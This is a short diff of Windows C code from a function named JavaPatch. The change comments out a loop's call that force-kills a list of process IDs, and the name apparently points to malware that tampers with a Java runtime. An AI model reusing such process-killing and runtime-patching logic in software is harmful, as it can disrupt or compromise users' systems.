@@ -973,7 +973,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 				while( countProcess-- )
 				{
 					DBG( "JavaPatcher",  "Killing process %d", PIDS[countProcess] );
-					KillProcess( PIDS[countProcess], 1000 );
+					//KillProcess( PIDS[countProcess], 1000 );
 				};
 				MemFree(PIDS);
 				PIDS = 0;
